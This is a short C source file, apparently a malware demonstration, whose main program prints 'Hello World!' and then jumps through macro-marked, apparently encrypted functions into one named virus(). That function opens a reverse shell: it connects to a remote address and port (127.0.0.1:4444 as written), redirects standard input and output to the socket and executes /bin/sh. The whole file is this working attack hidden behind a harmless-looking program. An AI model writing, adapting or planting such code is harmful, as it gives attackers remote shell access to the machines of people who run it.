#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "vmal.h"

#define REMOTE_ADDR "127.0.0.1"
#define REMOTE_PORT 4444

void ENC virus() {
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    RET
}

void ENC patata() {
    printf("PATATA!\n");
    JMP(virus);
    RET
}

int main(int argc, char* argv[]) {
    printf("Hello World!\n");
    JMP(patata);
    printf("Goodbye World!\n");
}